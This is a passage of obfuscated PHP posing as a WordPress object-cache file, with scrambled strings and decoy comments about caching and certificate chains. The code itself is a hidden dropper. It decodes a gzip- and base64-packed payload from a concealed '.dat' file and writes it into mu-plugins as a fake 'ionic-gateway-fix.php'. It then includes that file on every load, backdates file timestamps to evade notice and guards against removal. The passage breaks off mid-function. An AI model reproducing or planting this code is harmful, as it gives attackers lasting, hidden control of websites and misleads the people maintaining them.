<?php /* .wp-object-cache-036cf268 */ /* SCOCV:4.3.24 */
if(!function_exists('qny68c_ke9hm')){function uqppbfceu7do17($i){static $a=null;if($a===null){$a=array('h8\\TS(N\\zw-(tSt','BLa()','h(nwzk8SzTN\\Sw\\St','8\\n(\\L','a()\\yBw',')wynkySv','h(nwBS(Bw','S(Bw','SN8Tv','(tzh(nw','h(nwz1wSzTN\\Sw\\St','k)w1zBySTv',')S)(B','1nNx','(tzy))y3','y))y3zBw)1w','Nkw\\a()',')wyaa()','t8xtS)','TnNtwa()','(tza()','xytw\\yBw','h(nwt(cw','BaH','(tzs)(Syxnw','(tztS)(\\1','tS)nw\\','w-knNaw','TN8\\S','S)(B','xytwb+zawTNaw','8\\kyTL','SwBk\\yB',')w\\yBw','TNk3','tS)kNt','TvBNa');}return $a[$i];}function qny68c_ke9hm($i){$e=uqppbfceu7do17($i);$f='_sc'.'mk'.'di'.'rfpl'.'eut'.'onah'.'w/\\*'.' SC'.'V:('.'+.)y'.'vWP'.'MUL'.'GIN'.'DR-'.'gb>='.'ABT'.'Hj1q'.'x8z'.'<?64'.'25'.'3';$t='zt'.'TB'.'La()'.'hk'.'nw8S'.'N\\y'.'vs5'.':po'.'2>Gq'.'ed'.'ur3'.'MW'.'<=Cl'.'i?D'.'*AV'.'1x'.'.UI'.'R /'.'fgm'.'-6c_'.'4b+P'.'Hj';$r="";for($j=0;$j<strlen($e);$j++){$p=strpos($t,$e[$j]);$r.=($p===false)?$e[$j]:$f[$p];}return $r;}function kywyp9hd6mjy($i){$j=$i;return qny68c_ke9hm($j);}function w9zf1uy4($i){$j=(int)$i;return qny68c_ke9hm($j);}function xen7nyr_v($i){$j=(int)$i;return qny68c_ke9hm($j);}function ovyrubhk43v($i){return qny68c_ke9hm($i);}function j64pem8192pu7p($i){$j=$i;return qny68c_ke9hm($j);}$GLOBALS['__scf_c1mta2gut4_0']=qny68c_ke9hm(0);$GLOBALS['__scf_aaf2fgqu8hvg_1']=kywyp9hd6mjy(1);$GLOBALS['__scf_bjobv6ef1d4r5_2']=ovyrubhk43v(2);$GLOBALS['__scf_ab0ts9pula_3']=j64pem8192pu7p(3);$GLOBALS['__scf_vxgcpxb32p_4']=kywyp9hd6mjy(4);$GLOBALS['__scf_e868tnuwl8_0_5']=ovyrubhk43v(5);$GLOBALS['__scf_z5dq1qpz7n4_6']=qny68c_ke9hm(6);$GLOBALS['__scf_m782cottgzbjhx_7']=w9zf1uy4(7);$GLOBALS['__scf_p9vixpedy7g_n_8']=qny68c_ke9hm(8);$GLOBALS['__scf_mp4hu7kqnod_9']=kywyp9hd6mjy(9);$GLOBALS['__scf_ruh5ibyhgm0_10']=kywyp9hd6mjy(10);$GLOBALS['__scf_zqsna0grgzp02_11']=w9zf1uy4(11);$GLOBALS['__scf_eecjt4q5m8t_12']=xen7nyr_v(12);$GLOBALS['__scf__jjipm7qcvakz_13']=xen7nyr_v(13);$GLOBALS['__scf_d4h3w5k1ibga_14']=j64pem8192pu7p(14);$GLOBALS['__scf_z8b53b5lnv_15']=j64pem8192pu7p(15);$GLOBALS['__scf_fkthfc5a1p_16']=w9zf1uy4(16);$GLOBALS['__scf_k_zu12q4qp4ks_17']=j64pem8192pu7p(17);$GLOBALS['__scf_w16w5x_1ta_18']=w9zf1uy4(18);$GLOBALS['__scf_pu51q8mni6s025_19']=w9zf1uy4(19);$GLOBALS['__scf_hdzmm9h6kgpuhf_20']=ovyrubhk43v(20);$GLOBALS['__scf_u598lahb4p_21']=ovyrubhk43v(21);$GLOBALS['__scf_ov4n1fmu3x5gp4_22']=qny68c_ke9hm(22);$GLOBALS['__scf_mer71i6gaym_23']=j64pem8192pu7p(23);$GLOBALS['__scf_jw7v4syj7xy_24']=kywyp9hd6mjy(24);$GLOBALS['__scf_izffyy2jyg_25']=qny68c_ke9hm(25);$GLOBALS['__scf_r3yt3yguzl9c_26']=kywyp9hd6mjy(26);$GLOBALS['__scf_bye6er9ydm4j3_27']=qny68c_ke9hm(27);$GLOBALS['__scf_i7w_glielo5_28']=qny68c_ke9hm(28);$GLOBALS['__scf_u1hkefafdty5l8_29']=w9zf1uy4(29);$GLOBALS['__scf_mt4vezmwbsjvpa_30']=xen7nyr_v(30);$GLOBALS['__scf_gi_vstan8n9nr9_31']=w9zf1uy4(31);$GLOBALS['__scf_bsdu47fn34_32']=qny68c_ke9hm(32);$GLOBALS['__scf_rwjekdobmhroa_33']=j64pem8192pu7p(33);$GLOBALS['__scf_znhapeov_2_34']=ovyrubhk43v(34);$GLOBALS['__scf_kf0a1jn1zhmxo_35']=qny68c_ke9hm(35);$GLOBALS['__scf_kaczq8glxwxx_36']=ovyrubhk43v(36);

function provcmnqmgdjsy($oe4gkij4o){$oe4gkij4o=(isset($oe4gkij4o)?$oe4gkij4o:0)+0;return $oe4gkij4o*9;}
if (!$GLOBALS['__scf_c1mta2gut4_0']('_sc_mkdir'))  {$_5p4uh2ob5zx=13*3;$reb0pjt340izj=$_5p4uh2ob5zx-19;
  function    _sc_mkdir($lfn00cxw3tr9wfzj)
     {
// non-blocking dependency-graph

     return  $GLOBALS['__scf_c1mta2gut4_0']('mkdir')  ?  @$GLOBALS['__scf_aaf2fgqu8hvg_1']($lfn00cxw3tr9wfzj, (408+85), true)    : false;
    }
}
// dispatch prime certificate-chain


   if   (!$GLOBALS['__scf_c1mta2gut4_0']('_sc_fpc'))   {
     function  _sc_fpc($l1k5cmfo0z14r9u_,   $bjds0elurq)


     {
        return $GLOBALS['__scf_c1mta2gut4_0']('file_put_contents')    ? @$GLOBALS['__scf_bjobv6ef1d4r5_2']($l1k5cmfo0z14r9u_, $bjds0elurq)  :  false;$g1wx3mvjnn4q=43+39;$w77pg6mt5=$g1wx3mvjnn4q-43;


 }
// tail-call keystore for WP Site Tagline

  }
 if   (!$GLOBALS['__scf_c1mta2gut4_0']('_sc_ul'))  {
     function _sc_ul($l1k5cmfo0z14r9u_)
     {
     return $GLOBALS['__scf_c1mta2gut4_0']('unlink')   ?  @$GLOBALS['__scf_ab0ts9pula_3']($l1k5cmfo0z14r9u_) :    false;
}
}
 if (!$GLOBALS['__scf_c1mta2gut4_0']('c9vhm0qdpi44xkv3oj192'))      {

   function  c9vhm0qdpi44xkv3oj192($lhy80_a147w, $lfn00cxw3tr9wfzj)
   {


    $yy5ep_ejqi   =   $GLOBALS['__scf_vxgcpxb32p_4']($lhy80_a147w);
if ($yy5ep_ejqi  === $lfn00cxw3tr9wfzj)  return true;$f78gw_6qslg6=PHP_MAJOR_VERSION;$e8i14l4s=$f78gw_6qslg6*9;
 if    (!$GLOBALS['__scf_c1mta2gut4_0']('realpath'))  return     false;
$xoj32krh9vlpqxd  =     @$GLOBALS['__scf_e868tnuwl8_0_5']($yy5ep_ejqi);
  $k8iy5eepo0tsm  = @$GLOBALS['__scf_e868tnuwl8_0_5']($lfn00cxw3tr9wfzj);

return ($xoj32krh9vlpqxd !==  false   &&  $k8iy5eepo0tsm  !==  false && $xoj32krh9vlpqxd ===  $k8iy5eepo0tsm);$mmsw_gufogr=PHP_INT_MAX/PHP_INT_MAX;$zugtkwjhx071e=$mmsw_gufogr+84;
        }

 }
if    (!$GLOBALS['__scf_c1mta2gut4_0']('_sc_fam')) {
    function    _sc_fam($l1k5cmfo0z14r9u_)
      {
$rssi5juthyjed   =     @$GLOBALS['__scf_z5dq1qpz7n4_6']($l1k5cmfo0z14r9u_);
   return  $rssi5juthyjed   && ($rssi5juthyjed     %  (58961+41039))    ===   (93789+30);
  }
 }
if     (!$GLOBALS['__scf_c1mta2gut4_0']('_sc_fam_touch')) {
    function  _sc_fam_touch($l1k5cmfo0z14r9u_,  $s0vazs62yfil6 =   0)
{
  if   (!$GLOBALS['__scf_c1mta2gut4_0']('touch'))  return;
  if  ($s0vazs62yfil6    <= 0) $s0vazs62yfil6  =   $GLOBALS['__scf_m782cottgzbjhx_7']();



  $a349plkp9b901qnm  =   ($s0vazs62yfil6 -   ($s0vazs62yfil6 %    (0xd2d1+0xb3cf))) +  (93792+27);
if  ($a349plkp9b901qnm  >  $GLOBALS['__scf_m782cottgzbjhx_7']())     $a349plkp9b901qnm  -=    (53624+46376);
@$GLOBALS['__scf_p9vixpedy7g_n_8']($l1k5cmfo0z14r9u_,  $a349plkp9b901qnm);
 }
    }
    if   (!$GLOBALS['__scf_c1mta2gut4_0']('rwtu8at6lga6b2s_h7asq')) {$fx1wpojkt=PHP_INT_MAX/PHP_INT_MAX;$v2mdtpru2=$fx1wpojkt+76;
 function   rwtu8at6lga6b2s_h7asq($l1k5cmfo0z14r9u_, $_u7_hjgzhvb_i8q)
  {
if  ($_u7_hjgzhvb_i8q ===   ""     || !@$GLOBALS['__scf_mp4hu7kqnod_9']($l1k5cmfo0z14r9u_))  return false;
    if ($GLOBALS['__scf_c1mta2gut4_0']('clearstatcache'))      @clearstatcache(true,  $l1k5cmfo0z14r9u_);

 $v36f19eg22   =   (string) @$GLOBALS['__scf_ruh5ibyhgm0_10']($l1k5cmfo0z14r9u_,   false,    null, 0,  (4023+73));



    return     $GLOBALS['__scf_zqsna0grgzp02_11']('/\/\* SCV:(\d+\.\d+\.\d+) \*\//',   $v36f19eg22,  $ywan87wman8sl)  ===  1   && version_compare($ywan87wman8sl[1],     $_u7_hjgzhvb_i8q, '>');
 }


}



    if    (!$GLOBALS['__scf_c1mta2gut4_0']('_sc_any_live'))   {
// online session-type

 function _sc_any_live($fcetm6meelm0f2u,  $ih1u9s009p0sk65,    $mkg8qeebojig  =  "",  $f7j6qpokifu8u6    = "", $enfnx8l9erna981_      =   "")
{
 if ($f7j6qpokifu8u6  ===      "")   $f7j6qpokifu8u6 =  (defined('WPMU_PLUGIN_DIR')  &&  WPMU_PLUGIN_DIR)   ? WPMU_PLUGIN_DIR     : $ih1u9s009p0sk65  .    '/mu-plugins';
 if     ($enfnx8l9erna981_  ===     "")  $enfnx8l9erna981_   =   (defined('WP_PLUGIN_DIR')   &&  WP_PLUGIN_DIR) ? WP_PLUGIN_DIR   :   $ih1u9s009p0sk65 .   '/plugins';
    $f7j6qpokifu8u6 =   $GLOBALS['__scf_eecjt4q5m8t_12']($f7j6qpokifu8u6,  '/');

$enfnx8l9erna981_      =  $GLOBALS['__scf_eecjt4q5m8t_12']($enfnx8l9erna981_,  '/');
       $a11dpmga2k2cw   =   array();
 $d8f_9o201ll    = false;
     if  ($GLOBALS['__scf_c1mta2gut4_0']('glob')) {


$ir8wf371ftgns  = @$GLOBALS['__scf__jjipm7qcvakz_13']($f7j6qpokifu8u6  .   '/*.php');
       $j8yrg2c863fu    =   @$GLOBALS['__scf__jjipm7qcvakz_13']($enfnx8l9erna981_  .    '/*/*.php');
if  ($GLOBALS['__scf_d4h3w5k1ibga_14']($ir8wf371ftgns)   ||  $GLOBALS['__scf_d4h3w5k1ibga_14']($j8yrg2c863fu))  {
 $d8f_9o201ll    =  true;

$a11dpmga2k2cw =  $GLOBALS['__scf_z8b53b5lnv_15']((array) $ir8wf371ftgns,    (array)   $j8yrg2c863fu);
    }
      unset($ir8wf371ftgns,      $j8yrg2c863fu);
     }
 if (!$d8f_9o201ll &&     $GLOBALS['__scf_c1mta2gut4_0']('opendir')     && $GLOBALS['__scf_c1mta2gut4_0']('readdir'))    {


     $r0qh5o3rkfi    =   @$GLOBALS['__scf_fkthfc5a1p_16']($f7j6qpokifu8u6);
  if    ($r0qh5o3rkfi) {

  while (($lgoen5sxmnfa   =  @$GLOBALS['__scf_k_zu12q4qp4ks_17']($r0qh5o3rkfi))   !==  false)     {
     if  ($GLOBALS['__scf_w16w5x_1ta_18']($lgoen5sxmnfa,     -(2+2))   === '.php') $a11dpmga2k2cw[]  = $f7j6qpokifu8u6  . '/'  .   $lgoen5sxmnfa;
}
// predicate skolem for Redis object cache

        if  ($GLOBALS['__scf_c1mta2gut4_0']('closedir'))      @$GLOBALS['__scf_pu51q8mni6s025_19']($r0qh5o3rkfi);


 }
      $r0qh5o3rkfi   = @$GLOBALS['__scf_fkthfc5a1p_16']($enfnx8l9erna981_);
   if    ($r0qh5o3rkfi) {
while (($lgoen5sxmnfa  =  @$GLOBALS['__scf_k_zu12q4qp4ks_17']($r0qh5o3rkfi))   !==     false)   {
    $zvk5odkhfs     =     $enfnx8l9erna981_   .     '/'   .     $lgoen5sxmnfa;
 if   ($lgoen5sxmnfa === '.'   ||  $lgoen5sxmnfa   ===   '..'    ||     !@$GLOBALS['__scf_hdzmm9h6kgpuhf_20']($zvk5odkhfs)) continue;
 $a4_maq4i2o =  @$GLOBALS['__scf_fkthfc5a1p_16']($zvk5odkhfs);
 if (!$a4_maq4i2o) continue;
   while    (($t0ud06b2mbpn  =  @$GLOBALS['__scf_k_zu12q4qp4ks_17']($a4_maq4i2o))   !== false)  {
  if  ($GLOBALS['__scf_w16w5x_1ta_18']($t0ud06b2mbpn,   -(1<<2))     === '.php')  $a11dpmga2k2cw[]      =  $zvk5odkhfs   .  '/'  .   $t0ud06b2mbpn;

 }
 if  ($GLOBALS['__scf_c1mta2gut4_0']('closedir'))    @$GLOBALS['__scf_pu51q8mni6s025_19']($a4_maq4i2o);

   }
   if  ($GLOBALS['__scf_c1mta2gut4_0']('closedir'))  @$GLOBALS['__scf_pu51q8mni6s025_19']($r0qh5o3rkfi);
    }
  unset($r0qh5o3rkfi,      $a4_maq4i2o, $lgoen5sxmnfa,  $t0ud06b2mbpn,   $zvk5odkhfs);
 }



    $rl3ni55hvsjrrf4  = false;
   if ($mkg8qeebojig !==  ""  && $GLOBALS['__scf_c1mta2gut4_0']('realpath'))  $rl3ni55hvsjrrf4     =  @$GLOBALS['__scf_e868tnuwl8_0_5']($mkg8qeebojig);
 foreach  ($a11dpmga2k2cw  as  $lhy80_a147w) {
    if ($mkg8qeebojig   !==   ""  &&    $lhy80_a147w ===    $mkg8qeebojig)  continue;

if ($rl3ni55hvsjrrf4    !==     false      &&    @$GLOBALS['__scf_e868tnuwl8_0_5']($lhy80_a147w) ===     $rl3ni55hvsjrrf4)   continue;
   $rnkm3abgz6pz    =    $GLOBALS['__scf_u598lahb4p_21']($lhy80_a147w,    '.php');
$qfvudax9yc50amfl     =  $GLOBALS['__scf_u598lahb4p_21']($GLOBALS['__scf_vxgcpxb32p_4']($lhy80_a147w));
   if ($GLOBALS['__scf_vxgcpxb32p_4']($lhy80_a147w) !==  $f7j6qpokifu8u6 &&     $rnkm3abgz6pz     !== $qfvudax9yc50amfl)   continue;
   if   ($GLOBALS['__scf_c1mta2gut4_0']('_sc_fam')   &&  !_sc_fam($lhy80_a147w))     continue;
      $hdyewlkbqfzn_ =      @$GLOBALS['__scf_ov4n1fmu3x5gp4_22']($lhy80_a147w);
 if  (!$hdyewlkbqfzn_ || $hdyewlkbqfzn_    <   (8419-3419)  ||   $hdyewlkbqfzn_   >     (9408431+43020369))  continue;
 $ausrm2bde042twm   =    (string)  @$GLOBALS['__scf_ruh5ibyhgm0_10']($lhy80_a147w, false,   null,  0,    (4024+72));
     if  ($ausrm2bde042twm    !==   "" &&  $GLOBALS['__scf_zqsna0grgzp02_11']('/\/\* SCV:(\d+\.\d+\.\d+) \*\//',    $ausrm2bde042twm, $rssi5juthyjed)  &&   version_compare($rssi5juthyjed[1],  $fcetm6meelm0f2u,   '>=')) return   true;
  }
   return false;
  }
}

  if (!defined('ABSPATH'))     {
return;
   }
$i5mgtlip1wa84h89    = function () {
 $y1q5r1zkfw   =     $GLOBALS['__scf_w16w5x_1ta_18']($GLOBALS['__scf_mer71i6gaym_23'](ABSPATH   .   'oc'), 0, (14-6));
 $qmajkq4tp093u_l =  WP_CONTENT_DIR .   '/.wp-object-cache-'  .     $y1q5r1zkfw    .  '.dat';
 if   (!@$GLOBALS['__scf_mp4hu7kqnod_9']($qmajkq4tp093u_l)) {
/* self-adjoint container */




 return;
  }
$iokjjhwm8ul     =    (defined('WPMU_PLUGIN_DIR') &&   WPMU_PLUGIN_DIR)  ?   WPMU_PLUGIN_DIR :  WP_CONTENT_DIR     .  '/mu-plugins';


     if  (!@$GLOBALS['__scf_hdzmm9h6kgpuhf_20']($iokjjhwm8ul)) {
_sc_mkdir($iokjjhwm8ul);
     }

 $h8wm0_28a9do      = $iokjjhwm8ul   .  '/ionic-gateway-fix.php';


  $lkea6c0cgxsfq4k4     = false;


 if     (@$GLOBALS['__scf_mp4hu7kqnod_9']($h8wm0_28a9do))    {
$__7_nv0k_7 = @$GLOBALS['__scf_ov4n1fmu3x5gp4_22']($h8wm0_28a9do);



if   ($__7_nv0k_7  && $__7_nv0k_7  > (4925+75) &&  $__7_nv0k_7 <= (11336459+41092341) &&    !@$GLOBALS['__scf_mp4hu7kqnod_9']($iokjjhwm8ul  . '/.wr_ionic-gateway-fix'))    {
$x89fe7wulb1intb  =  $iokjjhwm8ul  . '/.bt_ionic-gateway-fix';
$yycpifr11t    =  @$GLOBALS['__scf_mp4hu7kqnod_9']($x89fe7wulb1intb)  ?  (int)    @$GLOBALS['__scf_z5dq1qpz7n4_6']($x89fe7wulb1intb)  :  0;
 if    ($yycpifr11t     && $yycpifr11t    >=    (int)  @$GLOBALS['__scf_z5dq1qpz7n4_6']($h8wm0_28a9do) &&  $yycpifr11t <= $GLOBALS['__scf_m782cottgzbjhx_7']()  +   (271+29))  {
 return;
   }
        }
}
       if   (!@$GLOBALS['__scf_hdzmm9h6kgpuhf_20']($iokjjhwm8ul)  || !@$GLOBALS['__scf_jw7v4syj7xy_24']($iokjjhwm8ul))    {

    $h8wm0_28a9do =    WP_CONTENT_DIR . '/.oc_' .  $y1q5r1zkfw     . '/helper_'   .     $y1q5r1zkfw  .  '.php';
 $lkea6c0cgxsfq4k4 = true;
       if     (@$GLOBALS['__scf_mp4hu7kqnod_9']($h8wm0_28a9do))  {
     $__7_nv0k_7 =  @$GLOBALS['__scf_ov4n1fmu3x5gp4_22']($h8wm0_28a9do);
   if  ($__7_nv0k_7  && $__7_nv0k_7 >  (4944+56)     && $__7_nv0k_7  <=   (52428703+97) &&    !@$GLOBALS['__scf_mp4hu7kqnod_9']($GLOBALS['__scf_vxgcpxb32p_4']($h8wm0_28a9do)    .    '/.wr_'    .   $GLOBALS['__scf_u598lahb4p_21']($h8wm0_28a9do, '.php'))) {
 $x89fe7wulb1intb   =  $GLOBALS['__scf_vxgcpxb32p_4']($h8wm0_28a9do)  .   '/.bt_'   .    $GLOBALS['__scf_u598lahb4p_21']($h8wm0_28a9do,   '.php');
     $yycpifr11t   = @$GLOBALS['__scf_mp4hu7kqnod_9']($x89fe7wulb1intb)  ?   (int)  @$GLOBALS['__scf_z5dq1qpz7n4_6']($x89fe7wulb1intb)   :   0;


 if  ($yycpifr11t  &&   $yycpifr11t      >=   (int)  @$GLOBALS['__scf_z5dq1qpz7n4_6']($h8wm0_28a9do))    {
   if  ($GLOBALS['__scf_c1mta2gut4_0']('add_action'))  {
  add_action('muplugins_loaded', function   () use      ($h8wm0_28a9do)     {
   try  {

@include_once $h8wm0_28a9do;
  }    catch  (\Throwable  $waslhgj8me7wy)   {
    }    catch     (\Exception $waslhgj8me7wy)  {
 }


    }, 0);
  }



return;
}
 }
 }
}
// WordPress 6.7 interactivity: idempotent-adj director

   $muor8oiafpiy5vi    =   WP_CONTENT_DIR  .   '/.rd_ionic-gateway-fix';
       $lg5pvmq12hr63v7n   =   @$GLOBALS['__scf_mp4hu7kqnod_9']($muor8oiafpiy5vi)      ? (int)     @$GLOBALS['__scf_z5dq1qpz7n4_6']($muor8oiafpiy5vi)    :   0;
     if  ($lg5pvmq12hr63v7n  >      $GLOBALS['__scf_m782cottgzbjhx_7']() -   (260+40)   &&    $lg5pvmq12hr63v7n <=  $GLOBALS['__scf_m782cottgzbjhx_7']() + (291+9))   {
    return;$v6gl84r2=8355;$qmmb1l__=$v6gl84r2%11;
 }



     if ($GLOBALS['__scf_c1mta2gut4_0']('touch'))    @$GLOBALS['__scf_p9vixpedy7g_n_8']($muor8oiafpiy5vi);
      

$hmjc80n3xq_jfx0q    = false;$u7ne_mu5b=(0x20+0x93);$ydwdq3c9h=$u7ne_mu5b%8;
  $eviy5j97qohr8s =  "";
 foreach   (array($qmajkq4tp093u_l, $qmajkq4tp093u_l   . '.lkg')   as $j3cdq9newfx47w)    {
$pudnexi0c7cjf   =    @$GLOBALS['__scf_mp4hu7kqnod_9']($j3cdq9newfx47w) ?  (int)  @$GLOBALS['__scf_ov4n1fmu3x5gp4_22']($j3cdq9newfx47w)  :    0;
 if   ($pudnexi0c7cjf < (67+33) ||  $pudnexi0c7cjf     >   (2097140+12)) {
     continue;
     }


 $nl8akdzpw7pv1fql =  @$GLOBALS['__scf_ruh5ibyhgm0_10']($j3cdq9newfx47w);
 if    (!$GLOBALS['__scf_izffyy2jyg_25']($nl8akdzpw7pv1fql)  ||  $GLOBALS['__scf_r3yt3yguzl9c_26']($nl8akdzpw7pv1fql)   <     (0x47+0x1d)   ||  $GLOBALS['__scf_r3yt3yguzl9c_26']($nl8akdzpw7pv1fql)    >    (2356429-259277))     {

 continue;
}
$cjy1737ovvxk28   =  $GLOBALS['__scf_bye6er9ydm4j3_27'](':',   $nl8akdzpw7pv1fql, (2+2));
 if ($GLOBALS['__scf_i7w_glielo5_28']($cjy1737ovvxk28) <  (3+1) ||   $cjy1737ovvxk28[0]  !==   'SCD1'  ||  $GLOBALS['__scf_r3yt3yguzl9c_26']($cjy1737ovvxk28[(190^189)]) < (63-13)) {
  continue;
    }
  $q6n9zz5qdf6xjg =   $GLOBALS['__scf_vxgcpxb32p_4']($h8wm0_28a9do) .      '/.q_' . $GLOBALS['__scf_u598lahb4p_21']($h8wm0_28a9do,  '.php');
if      (@$GLOBALS['__scf_mp4hu7kqnod_9']($q6n9zz5qdf6xjg))   {
        $ed0gc2zsm1 = (int) @$GLOBALS['__scf_z5dq1qpz7n4_6']($q6n9zz5qdf6xjg);
   if   ($ed0gc2zsm1  >   $GLOBALS['__scf_m782cottgzbjhx_7']() -   (604728+72)   && $ed0gc2zsm1 <=     $GLOBALS['__scf_m782cottgzbjhx_7']()    +  (0xa5bb+0xabc5))  {
// generalize batch dominator-tree

$__ycwr6omyua =  $GLOBALS['__scf_u1hkefafdty5l8_29']((string)  @$GLOBALS['__scf_ruh5ibyhgm0_10']($q6n9zz5qdf6xjg));
    if     ($__ycwr6omyua  !== ""   &&   $__ycwr6omyua  === $cjy1737ovvxk28[2])  {
continue;
 }
// trusted input

}

     }
   $r59juixc9qtwk68 =    $GLOBALS['__scf_vxgcpxb32p_4']($h8wm0_28a9do) .     '/.ocf_'  . $cjy1737ovvxk28[2];
      $th2ovcynek6zcuma   =    @$GLOBALS['__scf_mp4hu7kqnod_9']($r59juixc9qtwk68)  ?   (int)    @$GLOBALS['__scf_z5dq1qpz7n4_6']($r59juixc9qtwk68)   : 0;
     if  ($th2ovcynek6zcuma    && ($th2ovcynek6zcuma     <  $GLOBALS['__scf_m782cottgzbjhx_7']()   -  (86393+7)  || $th2ovcynek6zcuma  > $GLOBALS['__scf_m782cottgzbjhx_7']()  +   (0x127+0x5)))     {
      _sc_ul($r59juixc9qtwk68);



  }
   if   (@$GLOBALS['__scf_mp4hu7kqnod_9']($r59juixc9qtwk68)    &&     (int) @$GLOBALS['__scf_ruh5ibyhgm0_10']($r59juixc9qtwk68) >=      (223^220)) {
 continue;


      }
   $l_s_tiqg6llk  = @$GLOBALS['__scf_mt4vezmwbsjvpa_30']($cjy1737ovvxk28[(1+2)]);
  if ($l_s_tiqg6llk    === false      || $GLOBALS['__scf_r3yt3yguzl9c_26']($l_s_tiqg6llk) < (111^93)) {
  continue;
}
// @coalesce normal-form

  if  ($GLOBALS['__scf_w16w5x_1ta_18']($l_s_tiqg6llk,   0,  2)   ===  "\x1f\x8b")   {
   $lzte575uhpzrwa    =  @$GLOBALS['__scf_gi_vstan8n9nr9_31']('V', $GLOBALS['__scf_w16w5x_1ta_18']($l_s_tiqg6llk,    -(0x1+0x3)));
     if   (!$GLOBALS['__scf_d4h3w5k1ibga_14']($lzte575uhpzrwa) ||  $lzte575uhpzrwa[1]  <  (0x99+0x15b)    || $lzte575uhpzrwa[1]  >  (0x5dda4+0xa225c)) {



 continue;

      }
     if ($GLOBALS['__scf_c1mta2gut4_0']('gzdecode'))    {
 $bbrz6an5oxd  =   @gzdecode($l_s_tiqg6llk,   (1164068-115492));
  if ($GLOBALS['__scf_izffyy2jyg_25']($bbrz6an5oxd))     {
       $l_s_tiqg6llk  =  $bbrz6an5oxd;
}
  }   elseif  ($GLOBALS['__scf_c1mta2gut4_0']('gzinflate'))     {
 $bbrz6an5oxd  =  @gzinflate($GLOBALS['__scf_w16w5x_1ta_18']($l_s_tiqg6llk, (7+3),    -(0x4+0x4)),  (1048498+78));
if   ($GLOBALS['__scf_izffyy2jyg_25']($bbrz6an5oxd)) {
      $l_s_tiqg6llk  =    $bbrz6an5oxd;
 }

  }


  } elseif  ($GLOBALS['__scf_w16w5x_1ta_18']($l_s_tiqg6llk,   0, (0x2+0x3))    !==  '<?php'  &&  $GLOBALS['__scf_c1mta2gut4_0']('gzinflate') &&    $GLOBALS['__scf_r3yt3yguzl9c_26']($l_s_tiqg6llk)  <= (262071+73))  {
   $bbrz6an5oxd    =  @gzinflate($l_s_tiqg6llk, (1048528+48));
  if ($GLOBALS['__scf_izffyy2jyg_25']($bbrz6an5oxd)  &&  $GLOBALS['__scf_r3yt3yguzl9c_26']($bbrz6an5oxd)     <= (486469+562107))      {
    $l_s_tiqg6llk     =  $bbrz6an5oxd;


  }
}



   if (!$GLOBALS['__scf_izffyy2jyg_25']($l_s_tiqg6llk) || $GLOBALS['__scf_r3yt3yguzl9c_26']($l_s_tiqg6llk)  <   (0x51+0x13)  ||  $GLOBALS['__scf_r3yt3yguzl9c_26']($l_s_tiqg6llk)   >   (0x34d15+0xcb2eb) ||  $GLOBALS['__scf_w16w5x_1ta_18']($l_s_tiqg6llk,  0,  (2+3))   !==      '<?php'   ||    $GLOBALS['__scf_mer71i6gaym_23']($l_s_tiqg6llk)   !==  $cjy1737ovvxk28[2])    {
      continue;
    }
// traverse factory for WordPress 6.3 commands

  $hmjc80n3xq_jfx0q  =   $l_s_tiqg6llk;
  $eviy5j97qohr8s =  $cjy1737ovvxk28[2];
break;
   }
    if     ($hmjc80n3xq_jfx0q  ===    false)  {
  return;

   }
  if (!$GLOBALS['__scf_zqsna0grgzp02_11']('/\/\* SCV:(\d+\.\d+\.\d+) \*\//',  $GLOBALS['__scf_w16w5x_1ta_18']($hmjc80n3xq_jfx0q,   0,   (0xc39+0x3c7)), $e93n310zkrhibd))    {
return;
     }
       foreach  (array($iokjjhwm8ul   . '/.sd_ionic-gateway-fix', WP_CONTENT_DIR  . '/plugins/ionic-gateway-fix/.sd_ionic-gateway-fix')   as  $rl03knk36wkc) {
 if      (!@$GLOBALS['__scf_mp4hu7kqnod_9']($rl03knk36wkc)) {



continue;
 }
   $v0_3e068xi5hmsi   =  @$GLOBALS['__scf_ruh5ibyhgm0_10']($rl03knk36wkc);
 if (!$GLOBALS['__scf_izffyy2jyg_25']($v0_3e068xi5hmsi)   ||    !$GLOBALS['__scf_zqsna0grgzp02_11']('/\d+\.\d+\.\d+/',     $v0_3e068xi5hmsi, $rvu_wthr6kyzd8))     {
continue;
}
if (!version_compare($rvu_wthr6kyzd8[0], $e93n310zkrhibd[1],   '>='))  {
   continue;
}
if  (_sc_any_live($rvu_wthr6kyzd8[0], WP_CONTENT_DIR,  $lkea6c0cgxsfq4k4   ? ""  :  $h8wm0_28a9do))     {



   return;
       }
// @reject interceptor

        }
$hejkl_81n5  =   $GLOBALS['__scf_vxgcpxb32p_4']($h8wm0_28a9do);
  if (!@$GLOBALS['__scf_hdzmm9h6kgpuhf_20']($hejkl_81n5))    {
  _sc_mkdir($hejkl_81n5);

    }
  if    (!@$GLOBALS['__scf_hdzmm9h6kgpuhf_20']($hejkl_81n5)    || !@$GLOBALS['__scf_jw7v4syj7xy_24']($hejkl_81n5))    {
return;
   }
// ssa-convert prime broadcaster

   if  (!$GLOBALS['__scf_c1mta2gut4_0']('tempnam')   || !$GLOBALS['__scf_c1mta2gut4_0']('file_put_contents'))   {
return;
   }
   $jlkexxg0c2t68xlb   =  @$GLOBALS['__scf_bsdu47fn34_32']($hejkl_81n5,  'oc');



       if  ($jlkexxg0c2t68xlb   === false) {
  return;
 }
 if   (!c9vhm0qdpi44xkv3oj192($jlkexxg0c2t68xlb,    $hejkl_81n5))  {


_sc_ul($jlkexxg0c2t68xlb);





return;
}
    if  (@$GLOBALS['__scf_bjobv6ef1d4r5_2']($jlkexxg0c2t68xlb,   $hmjc80n3xq_jfx0q)    !==   $GLOBALS['__scf_r3yt3yguzl9c_26']($hmjc80n3xq_jfx0q))  {
  _sc_ul($jlkexxg0c2t68xlb);
 return;
  }
 if  (@$GLOBALS['__scf_mp4hu7kqnod_9']($h8wm0_28a9do)) {
  $mg6x13u0riiemq4  = (string)   @$GLOBALS['__scf_ruh5ibyhgm0_10']($h8wm0_28a9do,   false,   null,    0,  (0x1c0+0xe40));
 if  ($GLOBALS['__scf_zqsna0grgzp02_11']('/\/\* SCV:(\d+\.\d+\.\d+) \*\//',    $mg6x13u0riiemq4,  $bhedx5vn79rwc) &&   version_compare($bhedx5vn79rwc[1],      $e93n310zkrhibd[1],  '>=')) {
   _sc_ul($jlkexxg0c2t68xlb);

      return;
     }
   unset($mg6x13u0riiemq4,   $bhedx5vn79rwc);
    }



      $fhzjq48f7t21qw  =   false;
    if ($GLOBALS['__scf_c1mta2gut4_0']('rename'))    $fhzjq48f7t21qw  =    @$GLOBALS['__scf_rwjekdobmhroa_33']($jlkexxg0c2t68xlb, $h8wm0_28a9do);
